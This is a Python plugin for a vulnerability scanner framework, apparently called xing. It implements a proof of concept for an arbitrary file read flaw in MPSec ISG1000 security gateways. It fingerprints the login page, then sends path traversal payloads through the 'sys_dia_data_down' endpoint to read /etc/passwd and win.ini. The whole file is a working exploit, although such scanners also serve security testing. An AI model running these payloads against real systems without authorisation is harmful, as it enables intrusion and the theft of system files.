from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


# 参考 https://twitter.com/sec715/status/1402884871173795842

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "MPSec ISG1000 任意文件读取漏洞"
        self.app_name = 'MPSec'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        url = target + "/login.html"
        conn = http_req(url)

        if b'webui/js/jquerylib/jquery-1.7.2.min.js' not in conn.content:
            return False

        self.logger.debug("found MPSec ISG1000 ")
        payload_list = ["/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd",
                        "/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini"]

        check_list = [b'root:', b'for 16-bit app support']

        for path, check in zip(payload_list, check_list):
            url = target + path
            conn = http_req(url)
            if b"<" in conn.content or b'{' in conn.content:
                self.logger.debug("found < { in content")
                break

            if check in conn.content:
                self.logger.success("found MPSec ISG1000 vuln {}".format(url))
                return url


